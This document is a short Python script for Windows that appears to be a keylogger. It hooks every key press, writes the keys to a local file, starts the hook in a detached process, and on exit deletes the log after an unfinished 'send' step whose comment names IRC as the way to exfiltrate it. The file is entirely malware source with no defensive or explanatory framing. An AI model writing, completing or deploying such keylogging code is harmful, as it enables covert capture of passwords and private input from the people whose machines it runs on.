import win32api
import win32process
import concurrent.futures
import keyboard
from atexit import register
from os import remove

OUT = "out.txt"

# Function on program's exit
def sendAndErase():
    # Send mecanism --> IRC
    remove(OUT)
    print("END")
register(sendAndErase)

def logPress(key):
    with open(OUT, "a") as f:
        s = str(key).split(' ')[0].split("(")[1]
        if s == 'space':
            s = " "
        if s == "enter":
            s = "\nenter\n"
        f.write(s + "\n")
        print(s)

def K():      
    # Start recording keystrokes
    keyboard.on_press(logPress)
    # While True
    keyboard.wait()
         
def startK():
    # Create a new console to prevent the new process from inheriting the current console
    hstdout = win32api.GetStdHandle(win32api.STD_OUTPUT_HANDLE)
    creation_flags = win32process.CREATE_NEW_CONSOLE | win32process.DETACHED_PROCESS

    # Start the process in a new console session
    si = win32process.STARTUPINFO()
    si.dwFlags = win32process.STARTF_USESTDHANDLES
    si.hStdInput = hstdout
    si.hStdOutput = hstdout
    si.hStdError = hstdout

    # Create a process executor to start the function in a separate process
    with concurrent.futures.ProcessPoolExecutor() as executor:
        executor.submit(K)
    
if __name__ == "__main__":
    #startK()
    startK()